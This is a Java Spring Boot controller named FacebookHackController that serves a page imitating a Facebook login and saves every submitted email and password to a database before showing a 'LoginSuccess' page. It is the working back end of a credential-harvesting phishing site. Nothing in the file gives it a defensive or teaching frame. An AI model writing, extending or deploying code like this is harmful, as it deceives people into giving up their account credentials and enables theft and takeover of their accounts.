package com.first.projecthack.controller;

import com.first.projecthack.UserCredentials;
import com.first.projecthack.repository.UserCredentialsRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
@RequestMapping("/facebook")
public class FacebookHackController {

    @Autowired
    UserCredentialsRepository userCredentialsRepository;

    @GetMapping("/login")
    public String getFacebookPage() {
        return "facebook";
    }

    @PostMapping("/submit")
    public String facebookFormSubmitHandler(@RequestParam("email") String email,
                                          @RequestParam("password") String password) {

        userCredentialsRepository.save(UserCredentials.builder().username(email).password(password).build());
        return "LoginSuccess";
    }



}
